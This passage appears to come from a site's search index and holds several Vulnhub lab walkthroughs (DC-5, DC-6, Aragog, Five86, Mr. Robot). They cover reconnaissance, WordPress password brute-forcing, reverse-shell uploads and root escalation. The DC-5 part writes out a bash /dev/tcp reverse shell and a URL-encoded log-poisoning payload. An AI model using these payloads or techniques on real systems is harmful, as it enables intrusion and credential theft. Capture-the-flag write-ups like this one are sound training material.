192.168.197.131: ICMP echo request, id 1799, seq 9818, length 64 5 packets captured 6 packets received by filter 0 packets dropped by kernel   We received an ICMP request back, which means the command execution was successful. Now, we can attempt to establish a reverse shell.   Initial Foothold   Here, we use a one-liner bash reverse shell. We need to encode the shell into URL encoding format to avoid bad characters since we are using a browser.   Reverse shell bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.197.131/9001 0&gt;&amp;1'  Full Payload [http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=bash -c 'bash -i &gt;%26 %2Fdev%2Ftcp%2F192.168.197.131%2F9001 0&gt;%261'](http://192.168.197.133/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.197.131%2F9001%200%3E%261%27)      We obtained the reverse shell, successfully gaining the initial foothold.   Privilege Escalation   After obtaining the shell, I attempted to locate sensitive files, check privileges, and identify misconfigurations, but I did not find anything noteworthy. I then tried searching for GUIDs, but nothing interesting turned up. Finally, I explored SUID and discovered ‘screen 4.5.0,’ which seemed intriguing to me. I decided to investigate further.      From the exploitDB database i found privilege escalation script.      here i download the script using searchsploit kali linux builtin tools from exploit DB.      I start a python http server to transfer the payload to the victim machine.      from the victim machine i saw there is wget so its easier to download through wget.      Through wget i download the file to victim machine.      I made the file executable, ran it as is, and now I have root access.      The privilege escalation was quite easy. There wasn’t anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.  ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/vulnhub-dc-5-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub DC-6 Walkthrough",
        "excerpt":"For the initial foothold, we initiated a password brute-force attack based on a custom-generated password list, following a clue provided by the box’s author. After obtaining the password, we were able to log in to the web application and discovered the activity monitor. A search on Exploit-DB revealed a publicly available exploit that facilitated the initial foothold. While exploring the file system, we discovered a user credential with read, write, and execute permissions, along with the ability to run the file as a different user. Exploiting these permissions granted another user privilege. The new user gained the ability to run ‘nmap’ as root. Leveraging this, we created a simple script and executed it through ‘nmap’ as a superuser, ultimately achieving root access to the box.   Information Gathering  First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey:  |   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA) |   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA) |_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519) 80/tcp open  http    Apache httpd 2.4.25 ((Debian)) |_http-title: Did not follow redirect to http://wordy/ |_http-server-header: Apache/2.4.25 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap results, I found that this is a Debian-based Linux system with SSH and an Apache server installed. Apache is redirected to a domain called wordy. To visit the domain, you need to add an entry in the /etc/hosts file.   Manual Inspection      Upon manual inspection of the site, I discovered it’s a WordPress web application. It would be a good idea to run a WordPress scanner to thoroughly scan the application.   wpscan --enumerate --url $URL  [+] URL: http://wordy/ [192.168.197.137] [+] Started: Fri Oct 20 00:28:15 2023  Interesting Finding(s): [+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13). [+] WordPress theme in use: twentyseventeen  [i] User(s) Identified: [+] admin [+] mark [+] graham [+] sarah [+] jens   From the WPScanner output, I found the WordPress version, an outdated theme, but nothing significantly critical. Some users were revealed, but no passwords were disclosed. Now, let’s generate a password list with Cewl to conduct a password-based scan.   cewl -d 3 -w password.txt $URL      I generated a password and ran the password-based scan.   wpscan --url $URL --passwords password.txt  [+] Performing password attack on Xmlrpc against 5 user/s Trying graham / here Time: 00:00:07 &lt;=======&gt; (445 / 445) 100.00% Time: 00:00:07  [i] No Valid Passwords Found.   I couldn’t find any passwords. After spending a considerable amount of time, I sought some help and discovered a clue from the author on the download page, which I had missed earlier. This experience serves as a valuable lesson in the importance of thorough reconnaissance.      Following the clue, I generated a new password list.   cat /usr/share/wordlists/rockyou.txt| grep k01 &gt; password.txt      Run the password scan again.   wpscan --url $URL --passwords password.txt  [+] Performing password attack on Xmlrpc against 5 user/s [SUCCESS] - mark / helpdesk01                                                                                                                                                Trying sarah / !lak019b Time: 00:03:55 &lt;===&gt; (15215 / 15215) 100.00% Time: 00:03:55  [i] Valid Combinations Found:  | Username: mark, Password: helpdesk01   This time, I found one valid user credential. After logging into the portal, I discovered that this user is not an admin, so it’s not possible to manage a reverse shell using this dashboard. However, there is an activity monitor. Let’s try searching with this.      There are two exploit available, i want to use the python exploit.      Download the exploit to my local directory.      Initial Foothold   After running the exploit, it prompted for the IP, username, and password, and then provided the shell. Now, I’m in.      Privilege Escalation   After obtaining the shell as www-data, I discovered that I have access to the /home directories. Inside the ‘mark’ directory, I found a file named ‘things_to_do’ containing the username ‘graham’ and password.      As there is an SSH server, I logged into the box as ‘graham’ and found that ‘graham’ can run ‘/home/jens/backup.sh’ as ‘jens’ without a password.      I discovered that graham also has the ability to write the file. By abusing the file permission it’s possible to get jens users privilege.      From the ‘jens’ user, I found that ‘jens’ can run ‘nmap’ with sudo privileges without entering a password. This is a very dangerous privilege that can be abused by anyone.      There are two types of techniques to escalate privileges with sudo access: through interactive mode and through script execution. However, the interactive mode is available only on versions 2.02 to 5.21. So, let’s check the version.      In the updated version, the interactive mode is no longer supported, so we need to explore the other option: executing a script. Here, I created a script that will execute the ‘/bin/bash’ command, stored it in the tmp directory as ‘root.nse’, and executed the script, granting me root access.     ","categories": ["DC-Series"],
        "tags": [],
        "url": "/dc-series/vulnhub-dc-6-walkthroug/",
        "teaser": null
      },{
        "title": "Vulnhub Aragog Walkthrough",
        "excerpt":"This box is pretty straightforward; nothing complex here. Enumeration is the key. We need to enumerate and use the gathered information at the perfect moment. From the Nmap scan, we found the SSH and HTTP ports open. By visiting the web server, we discovered it’s a WordPress application, and there is a vulnerable plugin, wp-file-manager, which is susceptible to an Unauthenticated Arbitrary File Upload vulnerability. This vulnerability gives us the initial foothold.   For privilege escalation, the author of this box did not install WordPress in the usual place. We need to find out the configuration file, and from there, we can get the MySQL credentials. Logging into MySQL provides us with the hagrid98 user password hash. Using John, we decrypt the password and log in as the hagrid98 user. Then, we find the cronjob and modify the file to gain root access.   Information Gathering   First, I want to begin with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey:  |   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA) |   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA) |_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519) 80/tcp open  http    Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap scan, we found two publicly available ports: the first one being SSH, and the second one is HTTP. Both banners indicate it’s a Debian box. However, we did not gather much information from the Nmap results. Let’s manually check the application since we don’t have any credentials to work with SSH directly.   Manual Inspection      There is only a Harry Potter image available, and there’s no apparent user-server communication. At this point, we can begin fuzzing for directories and files.   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"$URL\"  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                         =====================================================================  000000069:   200        5 L      11 W       97 Ch       \"index.html\"                                                                                    000000157:   403        9 L      28 W       275 Ch      \".htaccess\"                                                                                     000000379:   200        5 L      11 W       97 Ch       \".\"                                                                                             000000537:   403        9 L      28 W       275 Ch      \".html\"                                                                                         000000806:   403        9 L      28 W       275 Ch      \".php\"                                                                                          000001564:   403        9 L      28 W       275 Ch      \".htpasswd\"                                                                                     000001830:   403        9 L      28 W       275 Ch      \".htm\"                                                                                          000002100:   403        9 L      28 W       275 Ch      \".htpasswds\"                                                                                    000004625:   403        9 L      28 W       275 Ch      \".htgroup\"                                                                                      000005172:   403        9 L      28 W       275 Ch      \"wp-forum.phps\"                                                                                 000007079:   403        9 L      28 W       275 Ch      \".htaccess.bak\"                                                                                 000008688:   403        9 L      28 W       275 Ch      \".htuser\"                                                                                       000011459:   403        9 L      28 W       275 Ch      \".ht\"                                                                                           000011460:   403        9 L      28 W       275 Ch      \".htc\"                                                                                          000017181:   403        9 L      28 W       275 Ch      \".htaccess.old\"                                                                                 000017182:   403        9 L      28 W       275 Ch      \".htacess\"   File fuzzing didn’t yield anything interesting. However, during directory fuzzing, I discovered a ‘blog’ directory with a status code of 301. Let’s visit the directory manually.   wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"$URL\"  ===================================================================== ID           Response   Lines    Word       Chars       Payload                                                                                         ===================================================================== 000000050:   301        9 L      28 W       307 Ch      \"blog\"                                                                                          000000139:   301        9 L      28 W       313 Ch      \"javascript\"                                                                                    000004227:   403        9 L      28 W       275 Ch      \"server-status\"   The application did not load properly. When I hovered the mouse over a link, I found a domain name. Let’s add this to the hosts file.   echo '10.10.10.7 wordpress.aragog.hogwarts' | sudo tee -a /etc/hosts  10.10.10.7 wordpress.aragog.hogwarts   Now the application is loaded properly and this is a WordPress application.      Always running some recon in the background is better. Since it’s a WordPress application, I would like to run WPScanner in the background to enumerate the themes and plugins used here.   wpscan --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive --url http://wordpress.aragog.hogwarts/blog   [+] URL: http://wordpress.aragog.hogwarts/blog/ [10.10.10.7] [+] Started: Tue Nov 14 20:14:07 2023  Interesting Finding(s):  [+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).  [+] WordPress theme in use: twentynineteen  | [!] The version is out of date, the latest version is 2.7  [i] Plugin(s) Identified:  [+] akismet  | Location: http://wordpress.aragog.hogwarts/blog/wp-content/plugins/akismet/  | Latest Version: 5.3  [+] wp-file-manager  | Version: 6.0 (100% confidence)   WPScanner found the default themes and plugins, and it identified the presence of the wp-file-manager plugin. At this point, I would like to search for publicly available exploits. The Exploit Database has a cross-site scripting vulnerability exploit for the Akismet plugin and an unauthenticated arbitrary file upload leading to RCE exploit for wp-file-manager plugins.      I copied the exploit into my current directory and ran it. Fortunately, it successfully exploited the vulnerability. It’s confirmed now that there is a file upload vulnerability leading to RCE. I attempted to take a reverse shell through RCE, but unfortunately, I failed.      So, I planned to upload a reverse shell file. This payload helped me successfully upload the file to the server.      Initial Foothold   I uploaded a PHP reverse shell payload file from PentesterMonkey.      After successfully uploaded the file i just visited this URl with a listener on to catch the revers shell.   http://wordpress.aragog.hogwarts//blog/wp-content/plugins/wp-file-manager/lib/files/exp.php   It gave me the initial foothold into the box by providing a reverse shell.      Post Enumeration &amp; Privilege Escalation   After obtaining the shell as www-data, I explored the file system and discovered the ‘.backup.sh’ file inside the ‘/opt’ directory. I only have execute and read permissions, and the owner of this file, ‘hagrid98,’ has full authority. Given the file name ‘backup’ and its function of copying files from the web server’s upload directory to the ‘tmp’ folder, there is a possibility of a cronjob. Since this is a WordPress installation, the config file may contain the MySQL credentials. Let’s find that.      From the backup script, we observed that the WordPress folder is not present inside ‘/var/www/html.’ They configured this in a different way. I want to find all folders named ‘wordpress’ first and will check each one for critical information.   www-data@Aragog:/var/www$ find / -type d -name wordpress 2&gt; /dev/null /var/lib/wordpress /var/lib/mysql/wordpress /usr/share/doc/wordpress /usr/share/wordpress /usr/share/wordpress/wp-includes/js/tinymce/skins/wordpress /usr/share/wordpress/wp-includes/js/tinymce/plugins/wordpress /etc/wordpress   However, from the ‘find’ command output, the first directory that caught my eye was the ‘/etc/wordpress’ folder. Inside the directory, I found the ‘config-default.php’ file containing the credentials.      Inside the database i found hagrid98 user and password hash.      John was so kind to decrypt the hash within a moment.      Now that I have the credentials, I tried to log in through SSH, and it succeeded. I now have a proper SSH connection into the box.      As the previous confusion about the cronjob persisted, I transferred pspy64 into the box and ran it to observe all the input and output activities inside the machine. Within a few moments, I got a hit from root to the ‘backup.sh’ file. Now, as the hagrid98 user, I have the ability to modify the file—I can put anything I want, and root will execute whatever I write into that file. Getting root is now just a piece of cake.      I modified the file and added a reverse shell script. When the root user executes the file, I will get a reverse shell as root.      I opened the listener and waited for root to execute the file. Within a minute, I got the shell, and I am now root.     ","categories": ["Harry-Potter-Series"],
        "tags": [],
        "url": "/harry-potter-series/vulnhub-aragog-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Five86 1 Walkthrough",
        "excerpt":"There are two enabled HTTP services and one SSH service. One of the HTTP services, called ‘opennetadmin,’ is outdated and has a publicly available exploit that provides the initial foothold. To escalate privileges for the first user access, find the ‘.htpassword’ file, which contains the username and password hash with a clue. Abusing the misconfigured ‘copy’ binary gives us the second user access. For the third user access, check the mailbox where you will find the last user’s credentials. At this point, we only need to find the secret game directory and execute a SUID binary to gain root access.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap_service_scan $IP PORT      STATE SERVICE VERSION 22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey:  |   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA) |   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA) |_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519) 80/tcp    open  http    Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn't have a title (text/html). | http-robots.txt: 1 disallowed entry  |_/ona 10000/tcp open  http    MiniServ 1.920 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   From the Nmap scan, we identified three open ports: SSH and two web servers. Port 80 has the ‘robots.txt’ file available, with a disallow entry. Port 10000 is also open, hosting Miniserv 1.920. Additionally, ports 22 and 80 confirmed that it’s a Debian-based Linux system. I would like to begin by exploring the web servers, so let’s dive into those.   Manual Inspection      Port 80 hosts a Webmin login panel, and as of now, I don’t have any credentials. I attempted the default credentials, but they did not work. Let’s visit port 80 to explore further.      Here, we’ve encountered a control panel that is displaying an outdated version warning. Let’s search for publicly available exploits for this specific version, if any are available.      Through Searchsploit, I discovered three exploits, and two of them match the version number. One of the exploits is available in the Metasploit framework. While I attempted the other bash file, the shell proved to be unstable. As a result, I’m opting to try the Metasploit framework.      From the metasploit i found only one command injection exploit.   Creds    💡 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1    Initial Foothold   I configured the ‘rhosts’ and ‘lhosts,’ then executed the exploit. After a few moments, it provided me with a shell as ‘www-data’.      Post Enumeration &amp; Privilege Escalation   After obtaining the shell, I explored the file system, and within ‘/var/www/html,’ I discovered the hidden ‘.htaccess’ file. This file contained a clue about the existence of a ‘.htpasswd’ file inside the ‘/var/www’ directory. Upon examining the ‘.htpasswd’ file, I found the ‘douglas’ user and his password MD5 hash, along with a clue on how to generate the password list for brute-force attacks.      Following the clue, I generated a wordlist using Crunch.   crunch 10 10 aefhrt &gt; wordlist.txt   The wordlist is so big.      While searching for ideas to optimize the wordlist due to its size and the potential time it would take, I came across a blog post. From the walkthrough, I got the idea to make the wordlist shorter. Observing that not every character from the clue was present in each line, I revised the wordlist to ensure that every character appeared in every line.      I initially ran John using the smaller wordlist. If I didn’t obtain any passwords, my plan was to then run it with the larger one. During that attempt, I would exclude the passwords containing characters I had already tried. This approach eliminates the need to check passwords that have already been tested. However, the password has already been decrypted using the small wordlist.      As the ssh port is available using this credential i just tried to login and it succeed.      Inside the Douglas user’s home directory, there is nothing but a .ssh directory. However, when I tried checking the sudo permissions for this user, I discovered that the user can run the ‘copy’ command with sudo privileges as the ‘jen’ user. Exploiting this misconfiguration allows us to copy anything we want. The challenge lies in not knowing the exact file location since the ‘copy’ command doesn’t provide that information. However, since there is SSH open, we can copy an authorized key into the ‘jen’ user’s home directory, allowing us to obtain an SSH shell as ‘jen’.      Here i have copied the id_rsa.pub key inside the /tmp folder.      Here, I executed the command to transfer the RSA file into the ‘jen’ user’s ‘home/.ssh’ directory as ‘authorized_keys’ and attempted to SSH as ‘jen.’ The operation succeeded, and I now have a shell as ‘jen’.      When I established the SSH connection, I noticed a message stating ‘You have mail.’ Directly navigating to the mail directory, I discovered a mail file named ‘jen.’ Inside the mail, I found the password for the ‘moss’ user.      I just changed the user as moss using the password found from the mail and found a hidden directory inside the moss users home directory called games.      Here are lots of games available but one of them has the SUID which could be the way for the root.      I just run the games and tried with random inputs but it gives me the root access every time so i assume there is nothing based on the input. And i’m root now.     ","categories": ["Five86-Series"],
        "tags": [],
        "url": "/five86-series/vulnhub-five86-1-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Five86 2 Walkthrough",
        "excerpt":"This is the last machine so far from this five86 series. This series proved to be interesting, offering numerous learning opportunities. Among the publicly available ports, FTP and the web server were present. However, the FTP was well-configured, with nothing initially available. The web application, when scanned using WPScanner, revealed some users and two valid user credential combinations. Upon obtaining the user credentials, logging into the web console and exploiting a simple file upload functionality provided the initial foothold. Password re-use granted the first user privilege. Achieving the second user privilege required executing an ARP poisoning attack. Finally, the third and last step to gain root access involved exploiting a misconfiguration in file super permissions.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap_service_scan $IP  PORT   STATE SERVICE VERSION 21/tcp open  ftp     ProFTPD 1.3.5e 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Five86-2 &amp;#8211; Just another WordPress site |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-generator: WordPress 5.1.4 Service Info: OS: Unix   According to the Nmap results, there are only two open ports on the system. Port 21 hosts an FTP service running ProFTPD version 1.3.5e, while port 80 serves a WordPress web application with WordPress version 5.1.4. The banners from both ports indicate that the operating system is Ubuntu.   Manual Inspection   First i would like to check the FTP servers with default credentials.      The anonymous login did not worked. So, let’s move forward with the web application.      When I visited the IP address, I noticed issues with the CSS not rendering properly. Additionally, hovering over a link displayed the domain name as ‘five86-2’. To address this, I plan to add the corresponding entry to the hosts file.   echo \"192.168.197.136 five86-2\" | sudo tee -a /etc/hosts   After adding the domain name to the hosts file, accessing the web application resulted in proper loading. However, I observed two additional links that, upon clicking, initiated the download of XML files.      The downloaded files turned out to be XML files with templates, which didn’t pique my interest. Consequently, I opted to skip these files and continue exploring.      Given that it’s a WordPress site, I decided to leverage WPScanner, which offers a password attack feature. To enhance the effectiveness of the attack, I attempted to generate a wordlist tailored to the web application. For this task, I employed the cewl tool.   cewl -d 3 -w password.txt http://five86-2   The generated word list isn’t extensive, and I’m uncertain if it will yield any valid credentials. In case it doesn’t produce any results, I plan to run the rockyou word list for a more comprehensive attempt.   wpscan --enumerate --passwords password.txt --url five86-2  [+] URL: http://five86-2/ [192.168.197.136] [+] Started: Fri Nov 10 22:11:22 2023  Interesting Finding(s):  [+] WordPress version 5.1.4 identified (Insecure, released on 2019-12-12).  [+] WordPress theme in use: twentynineteen  [+] Enumerating Vulnerable Plugins (via Passive Methods)  [i] No plugins Found.  [i] No themes Found.  [i] No Timthumbs Found.  [i] No Config Backups Found.  [i] No DB Exports Found.  [i] No Medias Found.  [i] User(s) Identified:  [+] admin [+] barney [+] gillian [+] peter [+] stephen  [i] No Valid Passwords Found.   As anticipated, WPScanner provided valid usernames, but unfortunately, no corresponding passwords. To address this, I intend to rerun WPScanner, this time utilizing the rockyou file.   wpscan --url five86-2 --passwords /usr/share/wordlists/rockyou.txt ---snip--- [+] Valid Combinations Found:  | Username: barney, Password: spooky1  | Username: stephen, Password: apollo1   This time, WPScanner yielded two valid credential combinations. I proceeded to attempt the login with the first set, using ‘barney’ as the username, and it successfully granted access.      After a few examination i have discovered that there is a functionality of adding post where i can upload files as well. however we need to submit a zip file inside the zip there should be one html file.      Following the specified criteria, I generated a PHP file containing malicious code, along with an empty HTML file, and compiled them into a zip archive.      I uploaded the file using the default options, selecting ‘iFrame,’ and it provided me with the file path of the HTML file.      Since my HTML file is located here, I expect that my PHP file should also be present in the same location.   Creds    💡 barney:spooky1 stephen:apollo1                                                                                                         paul:esomepasswford    Initial Foothold   With knowledge of the PHP file path, I initiated a netcat listener to capture the reverse shell and visited the corresponding URL.   http://five86-2//wp-content/uploads/articulate_uploads/shell3/shell.php      And i got the reverse shell as www-data.   Post Enumeration &amp; Privilege Escalation   Since we obtained two valid user credentials from WPScanner, we can now proceed with a password re-use attack.      I attempted to use Barney’s credentials, but they were unsuccessful. However, Stephen’s credentials worked, granting me Stephen’s privileges. Upon checking sudo permissions for these users, it appears that the user is not permitted to run sudo. To gather more information, I examined the groups Stephen belongs to, and an interesting detail emerged: the ‘pcap’ group.         What is this 1009(pcap) ?                                                                                             Regarding 1009(pcap), it indicates that the user is a member of a group with the group ID (GID) of 1009, and the group name is “pcap.” The “pcap” group is often associated with network packet capture permissions, and members of this group may have elevated privileges for capturing network traffic.     So i tried to find out all the interesting files capabilities and found the g tcpdump file.   getcap -r / 2&gt;/dev/null      I’ve identified all the running interfaces and aim to conduct an ARP poisoning attack to intercept data transmitted over any non-secure protocols. From the earlier Nmap results, I observed that the FTP port is open, and FTP is a non-secure protocol. There’s a possibility that if someone attempts to log in to the FTP protocol, we could capture their credentials in plain text.   tcpdump -D      I want to first dump the first interface.   tcpdump -i br-eca3858d86bf      I discovered the credentials for the user ‘paul’ during the ARP poisoning attack. In this controlled scenario, there might be a script performing these login requests. However, in a real environment, we would need to wait for a genuine user to initiate such actions. With the ‘paul’ user credentials in hand, I attempted to switch users, and the process succeeded.      After obtaining the shell as ‘paul,’ I checked the sudo privileges and discovered that he can execute the service binary with sudo without entering a password.      While the primary purpose of the service binary is to manage services, including starting, stopping, restarting, and checking their status, I exploited it to launch /bin/bash. This action granted me the ‘peter’ privilege.      Upon inspecting Peter’s sudo permissions, I discovered that he can execute the passwd command as root without requiring a password. Exploiting this, I changed the root user’s password and successfully logged in as root with the updated credentials.     ","categories": ["Five86-Series"],
        "tags": [],
        "url": "/five86-series/vulnhub-five86-2-walkthrough/",
        "teaser": null
      },{
        "title": "Vulnhub Mr. Robot 1 Walkthrough",
        "excerpt":"Mr. Robot-1   For the initial foothold, we need to discover the underlying technology of the web application. Upon checking the hidden files or directories, I found that it’s a WordPress web application. Additionally, I found the robots.txt file along with two other files, one of which is a wordlist. We can scan the application through WPScan with the wordlist, which should give us valid administrative user credentials.   After logging into the account, there are two ways to get a reverse shell: by adding a reverse shell plugin or by editing existing files. The privilege escalation is pretty straightforward; we need to identify the SUID binaries, where an older version of nmap is available with an interactive mode, which can lead to root privilege.   Information Gathering   First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.   Nmap   ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP  PORT    STATE SERVICE  VERSION 80/tcp  open  http     Apache httpd |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache 443/tcp open  ssl/http Apache httpd |_http-server-header: Apache | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after:  2025-09-13T10:45:03 |_http-title: Site doesn't have a title (text/html).   From the Nmap scan, we discovered only two open ports: 80 and 443, both of which are serving an Apache server. Additionally, we identified a domain name, www.example.com. We can add this domain to our host file and interact with it. Let’s begin by visiting the web application through the browser.   Manual Inspection   Both ports are serving the same web application, which resembles a machine web console. However, the available commands are limited, and it appears to be a simulated command-line interface rather than an original one. Given the constraints, there doesn’t seem to be a way to abuse this functionality.      Alright, let’s fire up Gobuster to perform directory and file fuzzing. This will help us uncover any hidden directories or files that might not be readily accessible through the web application interface. Gobuster is a powerful tool for this purpose, and it can help us gather more information about the web server and its directory structure.   gobuster dir -u http://192.168.197.146 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url:                     http://192.168.197.146 [+] Method:                  GET [+] Threads:                 10 [+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt [+] Negative Status codes:   404 [+] User Agent:              gobuster/3.6 [+] Timeout:                 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images               (Status: 301) [Size: 238] [--&gt; http://192.168.197.146/images/] /js                   (Status: 301) [Size: 234] [--&gt; http://192.168.197.146/js/] /admin                (Status: 301) [Size: 237] [--&gt; http://192.168.197.146/admin/] /wp-content           (Status: 301) [Size: 242] [--&gt; http://192.168.197.146/wp-content/] /css                  (Status: 301) [Size: 235] [--&gt; http://192.168.197.146/css/] /wp-admin             (Status: 301) [Size: 240] [--&gt; http://192.168.197.146/wp-admin/] /wp-includes          (Status: 301) [Size: 243] [--&gt; http://192.168.197.146/wp-includes/] /xmlrpc               (Status: 405) [Size: 42] /login                (Status: 302) [Size: 0] [--&gt; http://192.168.197.146/wp-login.php] /blog                 (Status: 301) [Size: 236] [--&gt; http://192.168.197.146/blog/] /feed                 (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/feed/] /rss                  (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/feed/] /video                (Status: 301) [Size: 237] [--&gt; http://192.168.197.146/video/] /sitemap              (Status: 200) [Size: 0] /image                (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/image/] /audio                (Status: 301) [Size: 237] [--&gt; http://192.168.197.146/audio/] /phpmyadmin           (Status: 403) [Size: 94] /dashboard            (Status: 302) [Size: 0] [--&gt; http://192.168.197.146/wp-admin/] /wp-login             (Status: 200) [Size: 2761] /0                    (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/0/] /atom                 (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/feed/atom/] /robots               (Status: 200) [Size: 41] /license              (Status: 200) [Size: 19930] /intro                (Status: 200) [Size: 516314] /Image                (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/Image/] /IMAGE                (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/IMAGE/] /rss2                 (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/feed/] /readme               (Status: 200) [Size: 7334] /rdf                  (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/feed/rdf/] /0000                 (Status: 301) [Size: 0] [--&gt; http://192.168.197.146/0000/] /wp-config            (Status: 200) [Size: 0]   Upon checking the Gobuster output, we discovered some interesting URLs. The most intriguing aspect is that the application is built on WordPress. Additionally, from the robots.txt file, we found two more filenames: one is first_key, and the other is a wordlist.      WordPress responds differently during login attempts depending on whether the username and password are correct or incorrect. To ensure accuracy, I ran Hydra using the file obtained from the application as a list of usernames and a simple password. After a short while, I received a valid username response. Now that I have a valid username, I can use Hydra again, this time with the username and the file as a password list to retrieve the password.      I utilized WPScan to discover the password for the username I found using Hydra, and I successfully retrieved the password. While WPScan can comprehensively explore WordPress installations, including usernames, passwords, and other vulnerabilities, I chose to skip that part since I already obtained the necessary information through Hydra.      I successfully logged into an administrative account. Given its administrative privileges, there are several methods to obtain a reverse shell. One option involves uploading a reverse shell plugin to acquire a reverse shell from there. Alternatively, we can edit an existing file to incorporate the reverse shell code and obtain a reverse shell from it.      Initial Foothold   For now, I will edit the 404 page because it’s easy to generate a 404 response. I’ve copied a reverse shell, updated the IP and port, and then saved the file.      Here, I’ve fired up a netcat listener to catch the reverse shell. From the browser, I generated a 404 response, and I successfully received the reverse shell from the machine.      Post Enumeration &amp; Privilege Escalation   I upgraded my shell using stty. From the robot user’s home directory, I obtained their username and password. The password was encrypted with MD5, as indicated in the filename. After cracking the hash, I changed the user to robot.      Crackstation crack the password very easily.      Now, I’ve searched for the SUID binaries and found nmap among them. The old version of nmap features an interactive mode through which we can potentially obtain a shell. Since nmap is listed as an SUID binary, there’s a possibility of escalating privileges to root from here.   find / -perm -u=s -type f 2&gt;/dev/null  /bin/ping /bin/umount /bin/mount /bin/ping6 /bin/su /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/local/bin/nmap /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper 